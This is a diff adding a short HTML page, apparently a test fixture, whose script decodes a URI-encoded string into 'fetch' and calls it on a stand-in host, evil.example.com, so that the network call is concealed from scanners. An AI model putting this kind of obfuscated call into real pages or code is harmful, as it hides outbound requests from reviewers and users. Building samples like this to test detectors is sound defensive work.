@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>URI Encoding Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: URI encoding to hide fetch
+    const fn = decodeURIComponent('%66%65%74%63%68');
+    window[fn]('https://evil.example.com');
+  </script>
+</body>
+</html>
